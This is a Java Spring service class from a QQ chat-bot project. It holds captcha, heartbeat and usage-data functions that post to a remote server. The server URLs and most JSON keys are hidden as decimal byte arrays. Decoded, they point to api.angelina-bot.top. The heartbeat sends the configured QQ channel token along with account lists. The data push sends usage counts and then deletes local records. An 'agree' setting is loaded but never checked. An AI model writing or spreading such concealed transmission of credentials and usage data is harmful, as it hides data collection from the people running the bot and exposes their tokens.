package top.angelinaBot.service;

import lombok.extern.slf4j.Slf4j;
import net.mamoe.mirai.Bot;
import org.json.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;
import top.angelinaBot.annotation.AngelinaFriend;
import top.angelinaBot.container.QQFrameContainer;
import top.angelinaBot.dao.ActivityMapper;
import top.angelinaBot.dao.AdminMapper;
import top.angelinaBot.dao.FunctionMapper;
import top.angelinaBot.model.*;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Service
@Slf4j
public class CenterService {

    @Autowired
    private RestTemplate restTemplate;

    @Value("${userConfig.botNames}")
    public String botNames;

    @Value("#{'${userConfig.qqList}'.split(' ')}")
    private String[] qqList;

    @Value("#{'${userConfig.typeList}'.split(' ')}")
    private String[] typeList;

    @Value("${userConfig.token}")
    public String userConfigToken;

    @Value("${userConfig.type}")
    public String userConfigType;

    @Value("${userConfig.agree}")
    public Boolean agree;

    @Autowired
    private AdminMapper adminMapper;

    @Autowired
    private FunctionMapper functionMapper;

    @Autowired
    private ActivityMapper activityMapper;

    @Autowired(required = false)
    private SendDataService sendDataService;

    @AngelinaFriend(keyWords = "验证")
    public ReplayInfo captcha(MessageInfo messageInfo) {
        ReplayInfo replayInfo = new ReplayInfo(messageInfo);
        if (messageInfo.getArgs().size() > 1 && messageInfo.getLoginQq().equals(messageInfo.getQq())) {
            String s = messageInfo.getArgs().get(1);
            String url = new String(new byte[]{104, 116, 116, 112, 58, 47, 47, 97, 112, 105, 46, 97, 110, 103, 101, 108, 105, 110, 97, 45, 98, 111, 116, 46, 116, 111, 112, 58, 56, 48, 56, 55, 47, 108, 111, 103, 105, 110, 47, 114, 101, 99, 101, 105, 118, 101, 67, 97, 112, 116, 99, 104, 97});
            HttpHeaders httpHeaders = new HttpHeaders();
            httpHeaders.setContentType(MediaType.APPLICATION_JSON);

            Map<String, Object> requestBody = new HashMap<>();
            requestBody.put("qq", messageInfo.getLoginQq());
            requestBody.put(new String(new byte[]{98, 111, 116, 73, 100}), adminMapper.selectId());
            requestBody.put(new String(new byte[]{99, 97, 112, 116, 99, 104, 97}), s);
            HttpEntity<Map<String, Object>> httpEntity = new HttpEntity<>(requestBody, httpHeaders);

            restTemplate.postForEntity(url, httpEntity, String.class);
            replayInfo.setReplayMessage("验证成功");
        } else {
            replayInfo.setReplayMessage("您还没输入验证码");
        }
        return replayInfo;
    }

    public void heartBeats() {
            try {
                String url = new String(new byte[]{104, 116, 116, 112, 58, 47, 47, 97, 112, 105, 46, 97, 110, 103, 101, 108, 105, 110, 97, 45, 98, 111, 116, 46, 116, 111, 112, 58, 56, 48, 56, 55, 47, 98, 111, 116, 47, 104, 101, 97, 114, 116, 66, 101, 97, 116, 115});

                String botId = null;
                String s = adminMapper.selectId();
                if (!"0".equals(s)) {
                    botId = s;
                }

                HttpHeaders httpHeaders = new HttpHeaders();
                httpHeaders.setContentType(MediaType.APPLICATION_JSON);

                Map<String, Object> requestBody = new HashMap<>();
                requestBody.put(new String(new byte[]{105, 100}), botId);
                requestBody.put(new String(new byte[]{110, 97, 109, 101}), botNames.split(" ")[0]);
                List<QQ> qqList1 = new ArrayList<>();
                for (int i = 0; i < qqList.length; i++) {
                    Bot instance = Bot.getInstanceOrNull(Long.parseLong(qqList[i]));
                    if (instance != null) {
                        qqList1.add(new QQ(qqList[i], QQFrameContainer.Miari, typeList[i], instance.isOnline()));
                    } else {
                        qqList1.add(new QQ(qqList[i], QQFrameContainer.Miari, typeList[i], false));
                    }
                }
                if (!userConfigToken.isEmpty()) {
                    qqList1.add(new QQ(userConfigToken, QQFrameContainer.QQChannel, userConfigType, true));
                }

                requestBody.put(new String(new byte[]{108, 105, 115, 116}), qqList1);

                HttpEntity<Map<String, Object>> httpEntity = new HttpEntity<>(requestBody, httpHeaders);

                String body = restTemplate.postForEntity(url, httpEntity, String.class).getBody();

                log.info("心跳成功");
                if (body != null && "0".equals(s)) {
                    JSONObject obj = new JSONObject(body);
                    adminMapper.updateId(obj.getString("data"));
                }
            } catch (Exception e) {
                log.error("心跳失败");
            }
    }

    public void pushData() {
            try {
                String url = new String(new byte[]{104, 116, 116, 112, 58, 47, 47, 97, 112, 105, 46, 97, 110, 103, 101, 108, 105, 110, 97, 45, 98, 111, 116, 46, 116, 111, 112, 58, 56, 48, 56, 55, 47, 98, 111, 116, 47, 112, 117, 115, 104, 68, 97, 116, 97});
                List<MessageCount> messageCount = activityMapper.selectCount();

                Runtime runtime = Runtime.getRuntime();
                long totalMemory = runtime.totalMemory() - runtime.freeMemory();
                List<FunctionCount> functionCount = functionMapper.selectFunction();

                HttpHeaders httpHeaders = new HttpHeaders();
                httpHeaders.setContentType(MediaType.APPLICATION_JSON);
                Map<String, Object> requestBody = new HashMap<>();
                requestBody.put(new String(new byte[]{109, 101, 115, 115, 97, 103, 101, 67, 111, 117, 110, 116}), messageCount);
                requestBody.put(new String(new byte[]{116, 111, 116, 97, 108, 77, 101, 109, 111, 114, 121}), totalMemory);
                requestBody.put(new String(new byte[]{102, 117, 110, 99, 116, 105, 111, 110, 67, 111, 117, 110, 116}), functionCount);
                requestBody.put(new String(new byte[]{98, 111, 116, 73, 100}), adminMapper.selectId());

                if (sendDataService != null) {
                    Count count = sendDataService.sendData();
                    if (count != null) {
                        requestBody.put(new String(new byte[]{113, 113, 67, 111, 117, 110, 116}), count.getQqCount());
                        requestBody.put(new String(new byte[]{103, 114, 111, 117, 112, 67, 111, 117, 110, 116}), count.getGroupCount());
                    }
                }

                HttpEntity<Map<String, Object>> httpEntity = new HttpEntity<>(requestBody, httpHeaders);
                restTemplate.postForEntity(url, httpEntity, String.class);

                activityMapper.clearActivity();
                functionMapper.deleteFunctionTable();
                log.info("运行数据同步成功");
            } catch (Exception e) {
                log.error("运行数据同步失败");
            }
    }
}
